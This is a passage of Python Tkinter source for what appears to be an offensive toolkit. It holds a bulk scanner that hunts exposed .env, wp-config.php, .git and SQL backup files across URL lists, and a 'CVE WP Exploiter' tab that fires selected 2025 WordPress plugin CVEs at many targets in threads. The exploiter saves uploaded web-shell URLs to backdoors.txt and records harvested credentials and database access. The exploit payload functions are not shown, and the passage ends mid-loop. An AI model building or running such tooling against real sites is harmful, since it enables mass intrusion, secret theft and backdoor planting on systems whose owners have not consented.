            messagebox.showinfo('Success', f"Filtered {self.stats['total']} URLs\nCleaned: {self.stats['cleaned']}\nRemoved: {self.stats['removed']}")
        except Exception as e:
            messagebox.showerror('Error', f'Error filtering URLs: {str(e)}')
        finally:
            self.filter_button.config(state=tk.NORMAL)

    def save_results(self):
        if not self.cleaned_urls:
            messagebox.showwarning('Warning', 'No cleaned URLs to save! Please filter URLs first.')
            return
        try:
            filename = 'clean.txt'
            with open(filename, 'w', encoding='utf-8') as f:
                for url in self.cleaned_urls:
                    f.write(url + '\n')
            messagebox.showinfo('Success', f'Saved {len(self.cleaned_urls)} cleaned URLs to:\n{filename}')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving file: {str(e)}')

class WebVulnCheckerTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_running = False
        self.stop_flag = False
        self.vulnerabilities = []
        self.vuln_file = None
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total': 0, 'processed': 0, 'vulnerable': 0}
        self.stats_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='WEB VULN CHECKER', font=('Courier', 20, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        input_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        input_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(input_frame, text='Target URL/File:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        url_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.url_entry = tk.Entry(url_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'])
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        tk.Button(url_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_file).pack(side=tk.LEFT)
        options_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        options_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(options_frame, text='Threads:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.threads_entry = tk.Entry(options_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=8)
        self.threads_entry.insert(0, '10')
        self.threads_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(options_frame, text='Timeout:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.timeout_entry = tk.Entry(options_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=8)
        self.timeout_entry.insert(0, '15')
        self.timeout_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(options_frame, text='Proxy:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.proxy_entry = tk.Entry(options_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=20)
        self.proxy_entry.pack(side=tk.LEFT)
        button_frame = tk.Frame(left_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, pady=(0, 8))
        self.start_button = tk.Button(button_frame, text='[START SCAN]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], command=self.start_scan, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.start_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.stop_button = tk.Button(button_frame, text='[STOP]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_red'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_red'], command=self.stop_scan, width=18, height=2, relief=tk.RAISED, borderwidth=2, state=tk.DISABLED, cursor='hand2')
        self.stop_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.save_button = tk.Button(button_frame, text='[SAVE RESULTS]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_cyan'], command=self.save_results, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.save_button.pack(side=tk.LEFT, fill=tk.X, expand=True)
        stats_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        stats_frame.pack(fill=tk.X, pady=(0, 8))
        self.stats_label = tk.Label(stats_frame, text='Total: 0 | Processed: 0 | Vulnerable: 0', font=('Courier', 9), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=5, pady=5)
        self.stats_label.pack(fill=tk.X)
        tk.Label(left_frame, text='Log:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        self.log_text = scrolledtext.ScrolledText(left_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], height=12, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        tk.Label(right_frame, text='Vulnerabilities Found:', font=('Courier', 10, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        self.vuln_text = scrolledtext.ScrolledText(right_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=35, wrap=tk.WORD)
        self.vuln_text.pack(fill=tk.BOTH, expand=True)

    def browse_file(self):
        filename = filedialog.askopenfilename(title='Select URL File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, filename)

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        self.log_queue.put((f'{timestamp} {message}\n', color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg)
                self.log_text.see(tk.END)
                line_count = int(self.log_text.index('end-1c').split('.')[0])
                if line_count >= 200:
                    self.log_text.delete(1.0, f'{line_count - 100}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats = self.stats_queue.get_nowait()
                with self.stats_lock:
                    self.stats.update(stats)
                self.stats_label.config(text=f"Total: {self.stats['total']} | Processed: {self.stats['processed']} | Vulnerable: {self.stats['vulnerable']}")
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

    def start_scan(self):
        if self.is_running:
            return
        url_input = self.url_entry.get().strip()
        if not url_input:
            messagebox.showwarning('Warning', 'Please enter URL or select file!')
            return
        try:
            threads = int(self.threads_entry.get())
            if threads < 1:
                threads = 1
            if threads > 20:
                threads = 20
        except:
            threads = 10
        try:
            timeout = int(self.timeout_entry.get())
            if timeout < 1:
                timeout = 15
            if timeout > 60:
                timeout = 60
        except:
            timeout = 15
        proxy = self.proxy_entry.get().strip()
        if proxy and (not proxy.startswith('http')):
            proxy = 'http://' + proxy
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        self.vuln_file = f'vuln_checker_{timestamp}.txt'
        self.is_running = True
        self.stop_flag = False
        self.vulnerabilities = []
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log(f'Starting vulnerability scan...')
        thread = threading.Thread(target=self.vuln_checker_worker, args=(url_input, threads, timeout, proxy), daemon=True)
        thread.start()

    def stop_scan(self):
        self.stop_flag = True
        self.is_running = False
        self.stop_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log('Scan stopped')

    def get_vuln_templates(self):
        return [{'name': 'WordPress Version Disclosure', 'method': 'GET', 'path': '/readme.html', 'matchers': ['WordPress'], 'severity': 'info'}, {'name': 'WordPress Login Page', 'method': 'GET', 'path': '/wp-login.php', 'matchers': ['wp-login', 'wordpress', 'username'], 'severity': 'info'}, {'name': 'Directory Listing', 'method': 'GET', 'path': '/', 'matchers': ['Index of', 'Directory listing', 'Parent Directory'], 'severity': 'low'}, {'name': 'PHP Info', 'method': 'GET', 'path': '/phpinfo.php', 'matchers': ['phpinfo', 'PHP Version'], 'severity': 'low'}, {'name': 'Backup Files', 'method': 'GET', 'path': '/backup.sql', 'matchers': ['CREATE TABLE', 'INSERT INTO'], 'severity': 'high'}, {'name': 'Config Files', 'method': 'GET', 'path': '/.env', 'matchers': ['DB_', 'APP_KEY', 'SECRET'], 'severity': 'high'}, {'name': 'Git Config', 'method': 'GET', 'path': '/.git/config', 'matchers': ['[core]', '[remote'], 'severity': 'high'}, {'name': 'DS_Store', 'method': 'GET', 'path': '/.DS_Store', 'matchers': ['DSDB'], 'severity': 'low'}, {'name': 'Robots.txt', 'method': 'GET', 'path': '/robots.txt', 'matchers': ['User-agent', 'Disallow'], 'severity': 'info'}, {'name': 'Sitemap.xml', 'method': 'GET', 'path': '/sitemap.xml', 'matchers': ['<urlset', '<url>'], 'severity': 'info'}, {'name': 'Crossdomain.xml', 'method': 'GET', 'path': '/crossdomain.xml', 'matchers': ['<cross-domain-policy'], 'severity': 'info'}, {'name': 'Web.config', 'method': 'GET', 'path': '/web.config', 'matchers': ['<configuration'], 'severity': 'medium'}, {'name': 'Wp-config.php Backup', 'method': 'GET', 'path': '/wp-config.php.bak', 'matchers': ['DB_NAME', 'DB_PASSWORD'], 'severity': 'high'}, {'name': 'Wp-config.php', 'method': 'GET', 'path': '/wp-config.php', 'matchers': ['DB_NAME', 'DB_PASSWORD'], 'severity': 'high'}, {'name': 'Error Log', 'method': 'GET', 'path': '/error_log', 'matchers': ['PHP', 'Warning', 'Error'], 'severity': 'medium'}, {'name': 'Apache Status', 'method': 'GET', 'path': '/server-status', 'matchers': ['Apache Server Status'], 'severity': 'medium'}, {'name': 'PHPMyAdmin', 'method': 'GET', 'path': '/phpmyadmin', 'matchers': ['phpMyAdmin', 'Welcome to phpMyAdmin'], 'severity': 'medium'}, {'name': 'Admin Panel', 'method': 'GET', 'path': '/admin', 'matchers': ['admin', 'login', 'password'], 'severity': 'info'}, {'name': 'Login Page', 'method': 'GET', 'path': '/login', 'matchers': ['login', 'username', 'password'], 'severity': 'info'}, {'name': 'Test Page', 'method': 'GET', 'path': '/test.php', 'matchers': ['test', 'phpinfo'], 'severity': 'low'}]

    def check_vulnerability(self, url, template, timeout, proxy):
        if self.stop_flag:
            return None
        try:
            full_url = urljoin(url, template['path'])
            headers = DEFAULT_HEADERS.copy()
            headers['User-Agent'] = random.choice(DORK_USER_AGENTS) if 'DORK_USER_AGENTS' in globals() else DEFAULT_USER_AGENT
            proxies = None
            if proxy:
                proxies = {'http': proxy, 'https': proxy}
            if template['method'] == 'GET':
                response = requests.get(full_url, headers=headers, timeout=timeout, verify=False, allow_redirects=True, proxies=proxies)
            else:
                response = requests.post(full_url, headers=headers, timeout=timeout, verify=False, allow_redirects=True, proxies=proxies)
            if response.status_code == 200:
                content = response.text.lower()
                for matcher in template['matchers']:
                    if matcher.lower() in content:
                        return {'url': full_url, 'name': template['name'], 'severity': template['severity'], 'status': response.status_code, 'matcher': matcher}
        except:
            pass
        return None

    def vuln_checker_worker(self, url_input, threads, timeout, proxy):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        urls = []
        if os.path.isfile(url_input):
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    urls = [line.strip() for line in f if line.strip() and (not line.strip().startswith('#'))]
            except:
                self.log('Error reading file')
                self.is_running = False
                self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
                return
        else:
            url = url_input
            if not url.startswith('http'):
                url = 'https://' + url
            urls = [url]
        if not urls:
            self.log('No URLs to process')
            self.is_running = False
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            return
        templates = self.get_vuln_templates()
        total_tasks = len(urls) * len(templates)
        self.stats_queue.put({'total': total_tasks})
        self.log(f'Processing {len(urls)} URLs with {len(templates)} templates...')
        try:
            with open(self.vuln_file, 'w', encoding='utf-8') as f:
                f.write(f"# Vulnerability Checker Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total URLs: {len(urls)} | Templates: {len(templates)}\n\n')
            max_workers = min(threads, 20)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {}
                for url in urls:
                    for template in templates:
                        if self.stop_flag:
                            break
                        future = executor.submit(self.check_vulnerability, url, template, timeout, proxy)
                        futures[future] = (url, template)
                for future in as_completed(futures):
                    if self.stop_flag:
                        break
                    url, template = futures[future]
                    try:
                        result = future.result()
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            if result:
                                self.vulnerabilities.append(result)
                                self.stats['vulnerable'] += 1
                                with open(self.vuln_file, 'a', encoding='utf-8') as f:
                                    f.write(f"[{result['severity'].upper()}] {result['name']} - {result['url']}\n")
                                self.log(f"[{result['severity'].upper()}] {result['name']} - {result['url']}")
                                self.frame.after(0, self.update_vuln_display)
                        self.stats_queue.put(self.stats.copy())
                    except Exception as e:
                        with self.stats_lock:
                            self.stats['processed'] += 1
                        self.stats_queue.put(self.stats.copy())
            self.log(f'Scan completed! Found {len(self.vulnerabilities)} vulnerabilities')
        except Exception as e:
            self.log(f'Error: {str(e)}')
        finally:
            self.is_running = False
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
            if not self.stop_flag:
                messagebox.showinfo('Success', f'Scan completed!\nFound {len(self.vulnerabilities)} vulnerabilities\n\nSaved to: {self.vuln_file}')

    def update_vuln_display(self):
        try:
            self.vuln_text.delete(1.0, tk.END)
            for vuln in self.vulnerabilities:
                severity_color = {'high': 'red', 'medium': 'yellow', 'low': 'cyan', 'info': 'white'}.get(vuln['severity'], 'white')
                self.vuln_text.insert(tk.END, f"[{vuln['severity'].upper()}] {vuln['name']}\n{vuln['url']}\n\n")
            self.vuln_text.see(tk.END)
        except:
            pass

    def save_results(self):
        if not self.vulnerabilities:
            messagebox.showwarning('Warning', 'No vulnerabilities to save!')
            return
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'vuln_checker_{timestamp}.txt'
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# Vulnerability Checker Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total Vulnerabilities: {len(self.vulnerabilities)}\n\n')
                for vuln in self.vulnerabilities:
                    f.write(f"[{vuln['severity'].upper()}] {vuln['name']} - {vuln['url']}\n")
            self.log(f'Results saved to: {filename}')
            messagebox.showinfo('Success', f'Saved {len(self.vulnerabilities)} vulnerabilities to:\n{filename}')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving: {str(e)}')

class CVEExploiterTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_running = False
        self.stop_flag = False
        self.exploited_targets = []
        self.exploited_file = None
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total': 0, 'processed': 0, 'exploited': 0}
        self.stats_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='CVE WP EXPLOITER', font=('Courier', 20, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        input_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        input_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(input_frame, text='Target URL/File:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        url_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.url_entry = tk.Entry(url_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'])
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        tk.Button(url_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_file).pack(side=tk.LEFT)
        cve_selection_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        cve_selection_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        tk.Label(cve_selection_frame, text='Select CVEs to Exploit:', font=('Courier', 9, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        canvas_cve_frame = tk.Frame(cve_selection_frame, bg=self.colors['bg'])
        canvas_cve_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        canvas_cve = tk.Canvas(canvas_cve_frame, bg=self.colors['bg'], highlightthickness=1, height=200)
        scrollbar_cve = ttk.Scrollbar(canvas_cve_frame, orient='vertical', command=canvas_cve.yview)
        scrollable_cve_frame = tk.Frame(canvas_cve, bg=self.colors['bg'])

        def update_cve_scrollregion(event=None):
            canvas_cve.update_idletasks()
            canvas_cve.configure(scrollregion=canvas_cve.bbox('all'))
        scrollable_cve_frame.bind('<Configure>', update_cve_scrollregion)
        canvas_cve.create_window((0, 0), window=scrollable_cve_frame, anchor='nw')
        canvas_cve.configure(yscrollcommand=scrollbar_cve.set)
        canvas_cve.pack(side='left', fill='both', expand=True)
        scrollbar_cve.pack(side='right', fill='y')
        self.cve_vars = {}
        self.cve_list = self.get_cve_list()
        for i, cve_info in enumerate(self.cve_list):
            var = tk.BooleanVar(value=False)
            self.cve_vars[cve_info['cve_id']] = (var, cve_info)
            checkbox = tk.Checkbutton(scrollable_cve_frame, text=f"{cve_info['cve_id']} - {cve_info['name']}", font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg'], activebackground=self.colors['bg'], activeforeground=self.colors['fg'], variable=var, wraplength=350, anchor='w', justify='left')
            checkbox.pack(anchor=tk.W, pady=2, padx=5)
        cve_button_frame = tk.Frame(cve_selection_frame, bg=self.colors['bg'])
        cve_button_frame.pack(fill=tk.X, pady=(5, 0), padx=10)
        tk.Button(cve_button_frame, text='Select All', font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg_green'], command=self.select_all_cves).pack(side=tk.LEFT, expand=True, fill=tk.X, padx=(0, 5))
        tk.Button(cve_button_frame, text='Select None', font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg_red'], command=self.deselect_all_cves).pack(side=tk.LEFT, expand=True, fill=tk.X, padx=(5, 0))
        options_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        options_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(options_frame, text='Options:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        thread_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        thread_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(thread_frame, text='Threads:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.threads_entry = tk.Entry(thread_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=8)
        self.threads_entry.insert(0, '10')
        self.threads_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(thread_frame, text='Timeout:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.timeout_entry = tk.Entry(thread_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=8)
        self.timeout_entry.insert(0, '15')
        self.timeout_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(thread_frame, text='Proxy:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.proxy_entry = tk.Entry(thread_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=20)
        self.proxy_entry.pack(side=tk.LEFT)
        button_frame = tk.Frame(left_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, pady=(0, 8))
        self.start_button = tk.Button(button_frame, text='[START EXPLOIT]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], command=self.start_exploit, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.start_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.stop_button = tk.Button(button_frame, text='[STOP]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_red'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_red'], command=self.stop_exploit, width=18, height=2, relief=tk.RAISED, borderwidth=2, state=tk.DISABLED, cursor='hand2')
        self.stop_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.save_button = tk.Button(button_frame, text='[SAVE RESULTS]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_cyan'], command=self.save_results, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.save_button.pack(side=tk.LEFT, fill=tk.X, expand=True)
        stats_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        stats_frame.pack(fill=tk.X, pady=(0, 8))
        self.stats_label = tk.Label(stats_frame, text='Total: 0 | Processed: 0 | Exploited: 0', font=('Courier', 9), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=5, pady=5)
        self.stats_label.pack(fill=tk.X)
        tk.Label(right_frame, text='Exploit Log:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        self.log_text = scrolledtext.ScrolledText(right_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], height=15, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        tk.Label(right_frame, text='Exploited Targets:', font=('Courier', 10, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        self.exploited_text = scrolledtext.ScrolledText(right_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=15, wrap=tk.WORD)
        self.exploited_text.pack(fill=tk.BOTH, expand=True)

    def browse_file(self):
        filename = filedialog.askopenfilename(title='Select URL File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, filename)

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        self.log_queue.put((f'{timestamp} {message}\n', color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg)
                self.log_text.see(tk.END)
                line_count = int(self.log_text.index('end-1c').split('.')[0])
                if line_count >= 200:
                    self.log_text.delete(1.0, f'{line_count - 100}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats = self.stats_queue.get_nowait()
                with self.stats_lock:
                    self.stats.update(stats)
                self.stats_label.config(text=f"Total: {self.stats['total']} | Processed: {self.stats['processed']} | Exploited: {self.stats['exploited']}")
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

    def select_all_cves(self):
        for var, _ in self.cve_vars.values():
            var.set(True)

    def deselect_all_cves(self):
        for var, _ in self.cve_vars.values():
            var.set(False)

    def get_cve_list(self):
        return [{'cve_id': 'CVE-2025-0493', 'name': 'MultiVendorX LFI', 'type': 'lfi'}, {'cve_id': 'CVE-2025-7384', 'name': 'Contact Form Entries PHP Object Injection', 'type': 'rce'}, {'cve_id': 'CVE-2025-5961', 'name': 'WPvivid Backup File Upload', 'type': 'upload'}, {'cve_id': 'CVE-2025-11833', 'name': 'Post SMTP Password Reset', 'type': 'auth'}, {'cve_id': 'CVE-2025-62047', 'name': 'Case Addons File Upload', 'type': 'upload'}, {'cve_id': 'CVE-2025-6389', 'name': 'WordPress Plugin RCE/File Upload', 'type': 'upload'}]

    def start_exploit(self):
        if self.is_running:
            return
        url_input = self.url_entry.get().strip()
        if not url_input:
            messagebox.showwarning('Warning', 'Please enter URL or select file!')
            return
        selected_cves = [cve_info for cve_id, (var, cve_info) in self.cve_vars.items() if var.get()]
        if not selected_cves:
            messagebox.showwarning('Warning', 'Please select at least one CVE to exploit!')
            return
        try:
            threads = int(self.threads_entry.get())
            if threads < 1:
                threads = 1
            if threads > 20:
                threads = 20
        except:
            threads = 10
        try:
            timeout = int(self.timeout_entry.get())
            if timeout < 1:
                timeout = 15
            if timeout > 60:
                timeout = 60
        except:
            timeout = 15
        proxy = self.proxy_entry.get().strip()
        if proxy and (not proxy.startswith('http')):
            proxy = 'http://' + proxy
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        self.exploited_file = f'exploited_{timestamp}.txt'
        self.is_running = True
        self.stop_flag = False
        self.exploited_targets = []
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log(f'Starting CVE exploitation...')
        thread = threading.Thread(target=self.exploit_worker, args=(url_input, selected_cves, threads, timeout, proxy), daemon=True)
        thread.start()

    def stop_exploit(self):
        self.stop_flag = True
        self.is_running = False
        self.stop_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log('Exploit stopped')

    def exploit_worker(self, url_input, selected_cves, threads, timeout, proxy):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        urls = []
        if os.path.isfile(url_input):
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    urls = [line.strip() for line in f if line.strip() and (not line.strip().startswith('#'))]
            except:
                self.log('Error reading file')
                self.is_running = False
                self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
                return
        else:
            url = url_input
            if not url.startswith('http'):
                url = 'https://' + url
            urls = [url]
        if not urls:
            self.log('No URLs to process')
            self.is_running = False
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            return
        total_tasks = len(urls) * len(selected_cves)
        self.stats_queue.put({'total': total_tasks})
        self.log(f'Processing {len(urls)} URLs with {len(selected_cves)} selected CVEs...')
        try:
            with open(self.exploited_file, 'w', encoding='utf-8') as f:
                f.write(f"# CVE Exploiter Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total URLs: {len(urls)} | CVEs: {len(selected_cves)}\n\n')
            max_workers = min(threads, 20)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {}
                for url in urls:
                    for cve_info in selected_cves:
                        if self.stop_flag:
                            break
                        future = executor.submit(self.execute_cve_exploit, url, cve_info, timeout, proxy)
                        futures[future] = (url, cve_info)
                for future in as_completed(futures):
                    if self.stop_flag:
                        break
                    url, cve_info = futures[future]
                    try:
                        result = future.result()
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            if result:
                                self.exploited_targets.append(result)
                                self.stats['exploited'] += 1
                                payload_info = result.get('payload', '')
                                shell_url = result.get('shell_url', '')
                                credentials = result.get('credentials', {})
                                db_tested = result.get('db_tested', False)
                                exploit_details = result.get('details', 'Exploited')
                                if payload_info:
                                    exploit_details += f' | Payload: {payload_info[:200]}'
                                if shell_url:
                                    exploit_details += f' | Shell: {shell_url}'
                                    try:
                                        with open('backdoors.txt', 'a', encoding='utf-8') as f:
                                            f.write(f'{shell_url}|POST\n')
                                    except:
                                        pass
                                if credentials:
                                    if isinstance(credentials, dict):
                                        cred_str = ', '.join([f'{k}:{v[:20]}...' if len(str(v)) > 20 else f'{k}:{v}' for k, v in credentials.items() if v])
                                    elif isinstance(credentials, list):
                                        cred_str = ', '.join([str(c)[:100] for c in credentials[:3]])
                                    else:
                                        cred_str = str(credentials)[:200]
                                    exploit_details += f' | Credentials: {cred_str}'
                                if db_tested:
                                    exploit_details += ' | DB Test: SUCCESS'
